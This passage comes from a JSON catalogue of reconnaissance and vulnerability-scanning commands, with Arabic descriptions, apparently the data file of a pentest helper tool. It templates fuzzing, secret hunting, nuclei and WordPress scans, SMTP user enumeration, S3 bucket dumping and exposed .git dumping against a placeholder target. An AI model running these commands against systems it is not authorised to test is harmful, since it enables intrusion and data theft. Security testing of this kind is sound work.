          "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 {{URL}}?FUZZ=test | tee wfuzz-params-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dirb",
        "description": "ماسح مجلدات كلاسيكي",
        "commands": [
          "dirb {{URL}} /usr/share/wordlists/dirb/common.txt -o dirb-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ffuf - Recursive",
        "description": "تخمين تكراري",
        "commands": [
          "ffuf -u {{URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -recursion -recursion-depth 2 -o ffuf-recursive-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - Response Filter",
        "description": "تصفية حسب حجم الرد",
        "commands": [
          "ffuf -u {{URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 1234 -o ffuf-filtered-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - Match",
        "description": "تطابق رموز محددة",
        "commands": [
          "ffuf -u {{URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302 -o ffuf-match-{{TARGET}}.json"
        ]
      },
      {
        "name": "ffuf - Rate Limit",
        "description": "تحديد معدل الطلبات",
        "commands": [
          "ffuf -u {{URL}}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -rate 100 -o ffuf-rate-{{TARGET}}.json"
        ]
      },
      {
        "name": "gobuster - Expanded",
        "description": "توسيع نتائج البحث",
        "commands": [
          "gobuster dir -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt,bak -o gobuster-expanded-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gobuster - Status Codes",
        "description": "رموز حالة مخصصة",
        "commands": [
          "gobuster dir -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/common.txt -s \"200,204,301,302,307\" -o gobuster-status-{{TARGET}}.txt"
        ]
      },
      {
        "name": "feroxbuster - Extract Links",
        "description": "استخراج الروابط أثناء الفحص",
        "commands": [
          "feroxbuster -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/common.txt --extract-links -o feroxbuster-links-{{TARGET}}.txt"
        ]
      },
      {
        "name": "feroxbuster - Auto-Tune",
        "description": "ضبط تلقائي للسرعة",
        "commands": [
          "feroxbuster -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --auto-tune -o feroxbuster-auto-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dirsearch - Include Status",
        "description": "تضمين رموز محددة",
        "commands": [
          "dirsearch -u {{URL}} -e * -i 200,301,302,401,403 -o dirsearch-status-{{TARGET}}.txt"
        ]
      },
      {
        "name": "dirsearch - Exclude",
        "description": "استبعاد رموز",
        "commands": [
          "dirsearch -u {{URL}} -e php,html -x 404,500 -o dirsearch-exclude-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wfuzz - Cookie Fuzzing",
        "description": "تخمين ملفات تعريف الارتباط",
        "commands": [
          "wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -b \"session=FUZZ\" {{URL}} | tee wfuzz-cookie-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wfuzz - Header Fuzzing",
        "description": "تخمين رؤوس HTTP",
        "commands": [
          "wfuzz -c -z file,/usr/share/seclists/Fuzzing/User-Agents.txt -H \"User-Agent: FUZZ\" {{URL}} | tee wfuzz-ua-{{TARGET}}.txt"
        ]
      },
      {
        "name": "meg - Multiple Paths",
        "description": "فحص مسارات متعددة",
        "commands": [
          "meg -v /usr/share/seclists/Discovery/Web-Content/common.txt subdomains.txt meg-{{TARGET}}"
        ]
      }
    ]
  },
  {
    "id": "parameter-discovery",
    "title": "Parameter Discovery",
    "titleAr": "اكتشاف المعاملات",
    "tools": [
      {
        "name": "arjun",
        "description": "اكتشاف معاملات HTTP",
        "commands": [
          "arjun -u {{URL}} -o arjun-{{TARGET}}.json"
        ]
      },
      {
        "name": "arjun - POST Method",
        "description": "معاملات POST",
        "commands": [
          "arjun -u {{URL}}/login -m POST -o arjun-post-{{TARGET}}.json"
        ]
      },
      {
        "name": "x8 - Hidden Parameters",
        "description": "اكتشاف معاملات مخفية",
        "commands": [
          "x8 -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o x8-{{TARGET}}.txt"
        ]
      },
      {
        "name": "x8 - JSON Parameters",
        "description": "معاملات JSON",
        "commands": [
          "x8 -u {{URL}}/api -X POST -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt --json -o x8-json-{{TARGET}}.txt"
        ]
      },
      {
        "name": "paramspider - Deep",
        "description": "استخراج معاملات عميق",
        "commands": [
          "paramspider -d {{TARGET}} --level high -o paramspider-deep-{{TARGET}}.txt"
        ]
      },
      {
        "name": "qsreplace",
        "description": "استبدال قيم المعاملات",
        "commands": [
          "cat urls.txt | qsreplace test | tee qsreplace-{{TARGET}}.txt"
        ]
      },
      {
        "name": "arjun - Stable Detection",
        "description": "كشف مستقر للمعاملات",
        "commands": [
          "arjun -u {{URL}} --stable -o arjun-stable-{{TARGET}}.json"
        ]
      },
      {
        "name": "x8 - Custom Wordlist",
        "description": "قائمة كلمات مخصصة",
        "commands": [
          "x8 -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --verify -o x8-verified-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ParamPamPam",
        "description": "اكتشاف معاملات متقدم",
        "commands": [
          "python3 ParamPamPam.py -u {{URL}} -o parampampam-{{TARGET}}.txt"
        ]
      },
      {
        "name": "ParamMiner",
        "description": "تعدين معاملات مخفية",
        "commands": [
          "param-miner -u {{URL}} -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o paramminer-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "js-secrets",
    "title": "JavaScript & Secrets Analysis",
    "titleAr": "تحليل JavaScript والأسرار",
    "tools": [
      {
        "name": "getJS",
        "description": "جمع ملفات JavaScript",
        "commands": [
          "getjs --url {{URL}} --output getjs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "subjs",
        "description": "استخراج JavaScript من نطاقات فرعية",
        "commands": [
          "cat subdomains.txt | subjs | tee subjs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "linkfinder",
        "description": "اكتشاف endpoints في JS",
        "commands": [
          "linkfinder -i {{URL}} -o linkfinder-{{TARGET}}.html"
        ]
      },
      {
        "name": "xnLinkFinder",
        "description": "اكتشاف روابط متقدم",
        "commands": [
          "xnLinkFinder -i {{URL}} -o xnlinkfinder-{{TARGET}}.txt"
        ]
      },
      {
        "name": "JSParser",
        "description": "تحليل ملفات JS",
        "commands": [
          "cat js-files.txt | while read url; do python3 JSParser.py -u \"$url\"; done | tee jsparser-{{TARGET}}.txt"
        ]
      },
      {
        "name": "secretfinder",
        "description": "البحث عن أسرار في JS",
        "commands": [
          "cat js-files.txt | while read url; do python3 SecretFinder.py -i \"$url\" -o cli; done | tee secretfinder-{{TARGET}}.txt"
        ]
      },
      {
        "name": "trufflehog",
        "description": "اكتشاف أسرار في Git",
        "commands": [
          "trufflehog git {{URL}} --json | tee trufflehog-{{TARGET}}.json"
        ]
      },
      {
        "name": "trufflehog - Filesystem",
        "description": "فحص نظام الملفات",
        "commands": [
          "trufflehog filesystem . --json | tee trufflehog-fs-{{TARGET}}.json"
        ]
      },
      {
        "name": "gitleaks",
        "description": "كشف تسريبات Git",
        "commands": [
          "gitleaks detect --source . -v --report-path gitleaks-{{TARGET}}.json"
        ]
      },
      {
        "name": "detect-secrets",
        "description": "اكتشاف أسرار في الكود",
        "commands": [
          "detect-secrets scan --all-files | tee detect-secrets-{{TARGET}}.json"
        ]
      },
      {
        "name": "JSFinder",
        "description": "بحث متقدم في JS",
        "commands": [
          "python3 JSFinder.py -u {{URL}} -ou jsfinder-{{TARGET}}.txt"
        ]
      },
      {
        "name": "relative-url-extractor",
        "description": "استخراج روابط نسبية",
        "commands": [
          "cat js-files.txt | while read url; do curl -s \"$url\" | ruby relative-url-extractor.rb; done | tee relative-urls-{{TARGET}}.txt"
        ]
      },
      {
        "name": "mantra",
        "description": "تحليل ملفات JavaScript",
        "commands": [
          "mantra -u {{URL}} -o mantra-{{TARGET}}.txt"
        ]
      },
      {
        "name": "GitDorker",
        "description": "Google Dorks للمستودعات",
        "commands": [
          "python3 GitDorker.py -tf /path/to/tokens.txt -q {{TARGET}} -d dorks.txt -o gitdorker-full-{{TARGET}}.txt"
        ]
      },
      {
        "name": "git-secrets",
        "description": "منع تسريب الأسرار في Git",
        "commands": [
          "git secrets --scan | tee git-secrets-{{TARGET}}.txt"
        ]
      },
      {
        "name": "TruffleHog - Verified",
        "description": "أسرار موثقة فقط",
        "commands": [
          "trufflehog git {{URL}} --only-verified --json | tee trufflehog-verified-{{TARGET}}.json"
        ]
      },
      {
        "name": "SecretFinder - Advanced",
        "description": "بحث متقدم عن الأسرار",
        "commands": [
          "cat js-files.txt | while read url; do python3 SecretFinder.py -i \"$url\" -o cli -e; done | tee secretfinder-advanced-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "automated-frameworks",
    "title": "Automated Recon Frameworks",
    "titleAr": "أدوات الاستطلاع الآلية",
    "tools": [
      {
        "name": "nuclei - Templates",
        "description": "فحص بقوالب Nuclei",
        "commands": [
          "nuclei -u {{URL}} -t /root/nuclei-templates/ -o nuclei-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nuclei - Severity High",
        "description": "قوالب عالية الخطورة فقط",
        "commands": [
          "nuclei -u {{URL}} -t /root/nuclei-templates/ -severity high,critical -o nuclei-high-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nuclei - CVE Templates",
        "description": "قوالب CVE",
        "commands": [
          "nuclei -u {{URL}} -t /root/nuclei-templates/cves/ -o nuclei-cves-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nuclei - Technology Detection",
        "description": "كشف التقنيات",
        "commands": [
          "nuclei -u {{URL}} -t /root/nuclei-templates/technologies/ -o nuclei-tech-{{TARGET}}.txt"
        ]
      },
      {
        "name": "jaeles",
        "description": "فحص آلي للويب",
        "commands": [
          "jaeles scan -u {{URL}} -o jaeles-{{TARGET}}.txt"
        ]
      },
      {
        "name": "reconftw",
        "description": "إطار عمل استطلاع شامل",
        "commands": [
          "reconftw -d {{TARGET}} -o reconftw-{{TARGET}}"
        ]
      },
      {
        "name": "lazyrecon",
        "description": "استطلاع آلي سريع",
        "commands": [
          "lazyrecon {{TARGET}}"
        ]
      },
      {
        "name": "nuclei - Dashboard",
        "description": "تشغيل مع لوحة تحكم",
        "commands": [
          "nuclei -u {{URL}} -dashboard -o nuclei-dashboard-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nuclei - Headless",
        "description": "فحص بدون رأس",
        "commands": [
          "nuclei -u {{URL}} -headless -o nuclei-headless-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nuclei - Tags",
        "description": "فحص بوسوم محددة",
        "commands": [
          "nuclei -u {{URL}} -tags xss,sqli,rce -o nuclei-tags-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nuclei - Exclude Tags",
        "description": "استبعاد وسوم",
        "commands": [
          "nuclei -u {{URL}} -exclude-tags dos,fuzz -o nuclei-exclude-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Sn1per - Full Scan",
        "description": "فحص شامل مع Sn1per",
        "commands": [
          "sniper -t {{TARGET}} -m fullportonly -o sn1per-full-{{TARGET}}"
        ]
      },
      {
        "name": "Sn1per - Web Mode",
        "description": "وضع فحص الويب",
        "commands": [
          "sniper -t {{URL}} -m web -o sn1per-web-{{TARGET}}"
        ]
      },
      {
        "name": "osmedeus - Full Scan",
        "description": "استطلاع شامل مع osmedeus",
        "commands": [
          "osmedeus scan -t {{TARGET}} -m full -o osmedeus-{{TARGET}}"
        ]
      },
      {
        "name": "BountyStrike",
        "description": "إطار عمل صيد الثغرات",
        "commands": [
          "bountystrike recon -d {{TARGET}} -o bountystrike-{{TARGET}}"
        ]
      },
      {
        "name": "Intrigue Core",
        "description": "استطلاع ذكي",
        "commands": [
          "intrigue-cli --create-entity DnsRecord --entity-details \"{{TARGET}}\" --project {{TARGET}}"
        ]
      }
    ]
  },
  {
    "id": "cors-smuggling",
    "title": "CORS, Smuggling & Misconfigurations",
    "titleAr": "CORS والتهريب وسوء التكوين",
    "tools": [
      {
        "name": "corsy",
        "description": "فحص CORS misconfiguration",
        "commands": [
          "python3 corsy.py -u {{URL}} | tee corsy-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CORScanner",
        "description": "ماسح CORS متقدم",
        "commands": [
          "python3 cors_scan.py -u {{URL}} -t 10 | tee corscanner-{{TARGET}}.txt"
        ]
      },
      {
        "name": "smuggler",
        "description": "كشف HTTP Request Smuggling",
        "commands": [
          "python3 smuggler.py -u {{URL}} | tee smuggler-{{TARGET}}.txt"
        ]
      },
      {
        "name": "shcheck",
        "description": "فحص Security Headers",
        "commands": [
          "shcheck.py {{URL}} | tee shcheck-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CORS-Scanner - All Methods",
        "description": "فحص جميع طرق CORS",
        "commands": [
          "python3 cors-scanner.py -u {{URL}} -t 20 -v | tee cors-all-{{TARGET}}.txt"
        ]
      },
      {
        "name": "h2cSmuggler",
        "description": "فحص H2C Smuggling",
        "commands": [
          "python3 h2csmuggler.py -x {{URL}} | tee h2csmuggler-{{TARGET}}.txt"
        ]
      },
      {
        "name": "http-request-smuggler",
        "description": "Burp Suite Smuggler",
        "commands": [
          "echo {{URL}} | http-request-smuggler | tee smuggler-burp-{{TARGET}}.txt"
        ]
      },
      {
        "name": "headi",
        "description": "فحص رؤوس الأمان",
        "commands": [
          "headi -url {{URL}} | tee headi-{{TARGET}}.txt"
        ]
      },
      {
        "name": "securityheaders.com",
        "description": "تحليل رؤوس الأمان",
        "commands": [
          "curl -s \"https://securityheaders.com/?q={{URL}}&hide=on&followRedirects=on\" | tee securityheaders-{{TARGET}}.html"
        ]
      }
    ]
  },
  {
    "id": "cms-detection",
    "title": "CMS & Framework Detection",
    "titleAr": "كشف أنظمة إدارة المحتوى",
    "tools": [
      {
        "name": "wpscan",
        "description": "فحص WordPress",
        "commands": [
          "wpscan --url {{URL}} -e ap,at,u --no-banner -o wpscan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wpscan - Aggressive",
        "description": "فحص عدواني لـ WordPress",
        "commands": [
          "wpscan --url {{URL}} --enumerate vp,vt,tt,cb,dbe,u --plugins-detection aggressive -o wpscan-aggressive-{{TARGET}}.txt"
        ]
      },
      {
        "name": "droopescan",
        "description": "فحص Drupal/Joomla/WordPress",
        "commands": [
          "droopescan scan drupal,joomla,wordpress -u {{URL}} -o droopescan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "joomscan",
        "description": "فحص Joomla",
        "commands": [
          "joomscan -u {{URL}} -o joomscan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "cmseek",
        "description": "كشف CMS متعدد",
        "commands": [
          "cmseek -u {{URL}} --batch | tee cmseek-{{TARGET}}.txt"
        ]
      },
      {
        "name": "whatcms",
        "description": "تحديد نظام CMS",
        "commands": [
          "whatcms {{URL}} | tee whatcms-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wpscan - Timthumbs",
        "description": "فحص TimThumb",
        "commands": [
          "wpscan --url {{URL}} -e tt --no-banner -o wpscan-timthumbs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wpscan - Config Backups",
        "description": "البحث عن نسخ احتياطية",
        "commands": [
          "wpscan --url {{URL}} -e cb --no-banner -o wpscan-backups-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wpscan - DB Exports",
        "description": "فحص قواعد بيانات مصدرة",
        "commands": [
          "wpscan --url {{URL}} -e dbe --no-banner -o wpscan-db-{{TARGET}}.txt"
        ]
      },
      {
        "name": "wpxf",
        "description": "WordPress Exploit Framework",
        "commands": [
          "wpxf -t {{URL}} | tee wpxf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Magescan",
        "description": "فحص Magento",
        "commands": [
          "magescan scan:all {{URL}} | tee magescan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "drupwn",
        "description": "فحص Drupal",
        "commands": [
          "python3 drupwn --target {{URL}} --mode enum | tee drupwn-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CMSmap",
        "description": "فحص أنظمة CMS متعددة",
        "commands": [
          "cmsmap -t {{URL}} -o cmsmap-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "osint",
    "title": "OSINT & ASN Recon",
    "titleAr": "استخبارات مفتوحة المصدر و ASN",
    "tools": [
      {
        "name": "theHarvester",
        "description": "جمع معلومات OSINT",
        "commands": [
          "theHarvester -d {{TARGET}} -b all -f theharvester-{{TARGET}}.html"
        ]
      },
      {
        "name": "theHarvester - DNS Only",
        "description": "جمع DNS فقط",
        "commands": [
          "theHarvester -d {{TARGET}} -b dnsdumpster,duckduckgo -f theharvester-dns-{{TARGET}}.html"
        ]
      },
      {
        "name": "recon-ng",
        "description": "إطار عمل استطلاع شامل",
        "commands": [
          "recon-ng -m recon/domains-hosts/hackertarget -o SOURCE={{TARGET}} -x"
        ]
      },
      {
        "name": "metagoofil",
        "description": "استخراج بيانات من ملفات",
        "commands": [
          "metagoofil -d {{TARGET}} -t pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx -l 100 -o metagoofil-{{TARGET}} -f metagoofil-{{TARGET}}.html"
        ]
      },
      {
        "name": "photon",
        "description": "زاحف OSINT سريع",
        "commands": [
          "python3 photon.py -u {{URL}} -o photon-{{TARGET}}"
        ]
      },
      {
        "name": "asnmap - ASN Lookup",
        "description": "اكتشاف ASN",
        "commands": [
          "asnmap -d {{TARGET}} -o asnmap-{{TARGET}}.txt"
        ]
      },
      {
        "name": "asnmap - IP Ranges",
        "description": "نطاقات IP من ASN",
        "commands": [
          "asnmap -d {{TARGET}} -json -o asnmap-json-{{TARGET}}.json"
        ]
      },
      {
        "name": "metabigor - ASN",
        "description": "جمع معلومات ASN",
        "commands": [
          "echo {{TARGET}} | metabigor net --org -o metabigor-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SpiderFoot",
        "description": "أداة OSINT شاملة",
        "commands": [
          "spiderfoot -s {{TARGET}} -o spiderfoot-{{TARGET}}"
        ]
      },
      {
        "name": "theHarvester - LinkedIn",
        "description": "جمع من LinkedIn",
        "commands": [
          "theHarvester -d {{TARGET}} -b linkedin -f theharvester-linkedin-{{TARGET}}.html"
        ]
      },
      {
        "name": "theHarvester - Twitter",
        "description": "جمع من Twitter",
        "commands": [
          "theHarvester -d {{TARGET}} -b twitter -f theharvester-twitter-{{TARGET}}.html"
        ]
      },
      {
        "name": "FOCA",
        "description": "تحليل البيانات الوصفية",
        "commands": [
          "foca -d {{TARGET}} -o foca-{{TARGET}}"
        ]
      },
      {
        "name": "Maltego Transform",
        "description": "تحويلات Maltego",
        "commands": [
          "maltego -domain {{TARGET}} -o maltego-{{TARGET}}.mtgx"
        ]
      },
      {
        "name": "Shodan - Full",
        "description": "معلومات شاملة من Shodan",
        "commands": [
          "shodan domain {{TARGET}} | tee shodan-full-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Censys - Certificates",
        "description": "شهادات من Censys",
        "commands": [
          "censys search \"parsed.names: {{TARGET}}\" | tee censys-certs-{{TARGET}}.txt"
        ]
      },
      {
        "name": "BGP View",
        "description": "معلومات BGP",
        "commands": [
          "curl -s \"https://api.bgpview.io/search?query_term={{TARGET}}\" | jq . | tee bgpview-{{TARGET}}.json"
        ]
      },
      {
        "name": "Hurricane Electric BGP",
        "description": "بحث BGP Toolkit",
        "commands": [
          "curl -s \"https://bgp.he.net/dns/{{TARGET}}\" | tee he-bgp-{{TARGET}}.html"
        ]
      },
      {
        "name": "URLScan.io",
        "description": "فحص وتحليل URL",
        "commands": [
          "curl -s \"https://urlscan.io/api/v1/search/?q=domain:{{TARGET}}\" | jq . | tee urlscan-{{TARGET}}.json"
        ]
      },
      {
        "name": "SecurityTrails",
        "description": "تاريخ DNS",
        "commands": [
          "curl -s \"https://api.securitytrails.com/v1/domain/{{TARGET}}/subdomains\" -H \"APIKEY: <key>\" | jq . | tee securitytrails-{{TARGET}}.json"
        ]
      }
    ]
  },
  {
    "id": "ssl-tls",
    "title": "TLS/SSL Analysis",
    "titleAr": "تحليل TLS/SSL",
    "tools": [
      {
        "name": "sslyze - Quick Scan",
        "description": "فحص SSL سريع",
        "commands": [
          "sslyze {{TARGET}} --regular | tee sslyze-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sslyze - Heartbleed",
        "description": "فحص ثغرة Heartbleed",
        "commands": [
          "sslyze {{TARGET}} --heartbleed | tee sslyze-heartbleed-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sslyze - Certificate Info",
        "description": "معلومات الشهادة",
        "commands": [
          "sslyze {{TARGET}} --certinfo | tee sslyze-certinfo-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - Full Scan",
        "description": "فحص SSL/TLS شامل",
        "commands": [
          "testssl.sh {{URL}} | tee testssl-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - Vulnerabilities",
        "description": "فحص ثغرات SSL",
        "commands": [
          "testssl.sh --vulnerable {{URL}} | tee testssl-vulns-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - Protocols",
        "description": "فحص بروتوكولات SSL/TLS",
        "commands": [
          "testssl.sh --protocols {{URL}} | tee testssl-protocols-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sslscan",
        "description": "فحص SSL تفصيلي",
        "commands": [
          "sslscan {{TARGET}} | tee sslscan-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sslscan - Show Certificate",
        "description": "عرض تفاصيل الشهادة",
        "commands": [
          "sslscan --show-certificate {{TARGET}} | tee sslscan-cert-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - BEAST",
        "description": "فحص ثغرة BEAST",
        "commands": [
          "testssl.sh --beast {{URL}} | tee testssl-beast-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - CRIME",
        "description": "فحص ثغرة CRIME",
        "commands": [
          "testssl.sh --crime {{URL}} | tee testssl-crime-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - POODLE",
        "description": "فحص ثغرة POODLE",
        "commands": [
          "testssl.sh --poodle {{URL}} | tee testssl-poodle-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - SWEET32",
        "description": "فحص ثغرة SWEET32",
        "commands": [
          "testssl.sh --sweet32 {{URL}} | tee testssl-sweet32-{{TARGET}}.txt"
        ]
      },
      {
        "name": "testssl.sh - ROBOT",
        "description": "فحص ثغرة ROBOT",
        "commands": [
          "testssl.sh --robot {{URL}} | tee testssl-robot-{{TARGET}}.txt"
        ]
      },
      {
        "name": "sslyze - All Scans",
        "description": "جميع فحوصات SSL",
        "commands": [
          "sslyze {{TARGET}} --regular --certinfo --heartbleed --robot | tee sslyze-all-{{TARGET}}.txt"
        ]
      },
      {
        "name": "o-saft",
        "description": "OWASP SSL Advanced Forensic Tool",
        "commands": [
          "o-saft.pl +check {{TARGET}} | tee o-saft-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SSL Labs API",
        "description": "تحليل SSL Labs",
        "commands": [
          "curl -s \"https://api.ssllabs.com/api/v3/analyze?host={{TARGET}}\" | jq . | tee ssllabs-{{TARGET}}.json"
        ]
      }
    ]
  },
  {
    "id": "waf-detection",
    "title": "WAF & Security Detection",
    "titleAr": "كشف جدران الحماية والأمان",
    "tools": [
      {
        "name": "wafw00f - Detect WAF",
        "description": "كشف WAF تلقائي",
        "commands": [
          "wafw00f {{URL}} | tee wafw00f-detect-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - WAF Scripts",
        "description": "نصوص nmap لكشف WAF",
        "commands": [
          "nmap --script http-waf-detect,http-waf-fingerprint -p80,443 {{TARGET}} -oN nmap-waf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "nmap - Firewall Detect",
        "description": "كشف الجدار الناري",
        "commands": [
          "nmap -sA -p- {{TARGET}} -oN nmap-firewall-{{TARGET}}.txt"
        ]
      },
      {
        "name": "identYwaf",
        "description": "تحديد WAF بالذكاء الاصطناعي",
        "commands": [
          "python3 identYwaf.py -u {{URL}} | tee identywaf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "WafW00f - Verbose",
        "description": "وضع مفصل لكشف WAF",
        "commands": [
          "wafw00f {{URL}} -v | tee wafw00f-verbose-{{TARGET}}.txt"
        ]
      }
    ]
  },
  {
    "id": "cloud-storage",
    "title": "Cloud Storage & Buckets",
    "titleAr": "التخزين السحابي",
    "tools": [
      {
        "name": "S3 Bucket Finder",
        "description": "البحث عن S3 buckets",
        "commands": [
          "echo {{TARGET}} | sed 's/\\./-/g' | while read bucket; do aws s3 ls s3://$bucket 2>&1 | grep -v 'NoSuchBucket'; done"
        ]
      },
      {
        "name": "S3Scanner",
        "description": "فحص S3 buckets",
        "commands": [
          "s3scanner scan --bucket {{TARGET}} | tee s3scanner-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Cloud Enum",
        "description": "تعداد موارد السحابة",
        "commands": [
          "cloud_enum -k {{TARGET}} -l cloud-enum-{{TARGET}}.txt"
        ]
      },
      {
        "name": "S3Scanner - Dump",
        "description": "تفريغ محتويات S3",
        "commands": [
          "s3scanner --bucket {{TARGET}} --dump | tee s3scanner-dump-{{TARGET}}.txt"
        ]
      },
      {
        "name": "CloudBrute",
        "description": "القوة الغاشمة للسحابة",
        "commands": [
          "cloudbrute -d {{TARGET}} -k {{TARGET}} -w /usr/share/seclists/Discovery/Web-Content/common.txt | tee cloudbrute-{{TARGET}}.txt"
        ]
      },
      {
        "name": "lazys3",
        "description": "فحص S3 سريع",
        "commands": [
          "ruby lazys3.rb {{TARGET}} | tee lazys3-{{TARGET}}.txt"
        ]
      },
      {
        "name": "AWS CLI - List Buckets",
        "description": "قائمة S3 buckets",
        "commands": [
          "aws s3 ls s3://{{TARGET}} --no-sign-request | tee aws-s3-{{TARGET}}.txt"
        ]
      },
      {
        "name": "GCP Bucket Finder",
        "description": "البحث عن Google Cloud buckets",
        "commands": [
          "curl -s \"https://www.googleapis.com/storage/v1/b/{{TARGET}}\" | jq . | tee gcp-bucket-{{TARGET}}.json"
        ]
      },
      {
        "name": "Azure Blob Finder",
        "description": "البحث عن Azure blobs",
        "commands": [
          "curl -s \"https://{{TARGET}}.blob.core.windows.net/?comp=list\" | tee azure-blob-{{TARGET}}.xml"
        ]
      }
    ]
  },
  {
    "id": "email-mx",
    "title": "Email & MX Records",
    "titleAr": "البريد الإلكتروني وسجلات MX",
    "tools": [
      {
        "name": "MX Record Lookup",
        "description": "البحث عن سجلات MX",
        "commands": [
          "dig MX {{TARGET}} +short | tee mx-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SPF Record Check",
        "description": "فحص سجل SPF",
        "commands": [
          "dig TXT {{TARGET}} +short | grep 'v=spf1' | tee spf-{{TARGET}}.txt"
        ]
      },
      {
        "name": "DMARC Check",
        "description": "فحص DMARC",
        "commands": [
          "dig TXT _dmarc.{{TARGET}} +short | tee dmarc-{{TARGET}}.txt"
        ]
      },
      {
        "name": "Email Verification",
        "description": "التحقق من البريد الإلكتروني",
        "commands": [
          "theHarvester -d {{TARGET}} -b all | grep '@' | tee emails-{{TARGET}}.txt"
        ]
      },
      {
        "name": "SMTP User Enum",
        "description": "تعداد مستخدمي SMTP",
        "commands": [
          "smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t {{TARGET}}"
        ]
      },
      {
        "name": "swaks - SMTP Test",
        "description": "اختبار SMTP",
        "commands": [
          "swaks --to test@{{TARGET}} --from test@example.com --server {{TARGET}} --header \"Subject: Test\""
        ]
      }
    ]
  },
  {
    "id": "github-recon",
    "title": "GitHub & Code Repositories",
    "titleAr": "GitHub ومستودعات الكود",
    "tools": [
      {
        "name": "gitgraber",
        "description": "البحث عن أسرار في GitHub",
        "commands": [
          "gitgraber -k {{TARGET}} -o gitgraber-{{TARGET}}.txt"
        ]
      },
      {
        "name": "gitrob",
        "description": "تحليل مستودعات GitHub",
        "commands": [
          "gitrob {{TARGET}} -output gitrob-{{TARGET}}"
        ]
      },
      {
        "name": "gitdorker",
        "description": "Google Dorks لـ GitHub",
        "commands": [
          "python3 GitDorker.py -t <token> -d {{TARGET}} -o gitdorker-{{TARGET}}.txt"
        ]
      },
      {
        "name": "shhgit",
        "description": "كشف أسرار في الوقت الفعلي",
        "commands": [
          "shhgit --search-query {{TARGET}} | tee shhgit-{{TARGET}}.txt"
        ]
      },
      {
        "name": "GitHacker",
        "description": "استغلال Git مكشوف",
        "commands": [
          "githacker --url {{URL}}/.git/ --output-folder githacker-{{TARGET}}"
        ]
      },
      {
        "name": "GitTools - Dumper",
        "description": "تفريغ مستودع Git",
        "commands": [
          "./gitdumper.sh {{URL}}/.git/ gitdump-{{TARGET}}"
        ]
      },
      {
        "name": "GitTools - Extractor",
        "description": "استخراج commits",
        "commands": [
          "./extractor.sh gitdump-{{TARGET}} extracted-{{TARGET}}"
        ]
      }
    ]
  },
  {
    "id": "api-testing",
    "title": "API Testing & GraphQL",
    "titleAr": "اختبار API و GraphQL",
    "tools": [
      {
        "name": "GraphQL - Introspection",
        "description": "استعلام Introspection",
        "commands": [
          "curl -X POST {{URL}}/graphql -H \"Content-Type: application/json\" -d '{\"query\":\"{__schema{types{name}}}\"}' | tee graphql-introspection-{{TARGET}}.json"
        ]
      },
      {
        "name": "GraphQL Voyager",
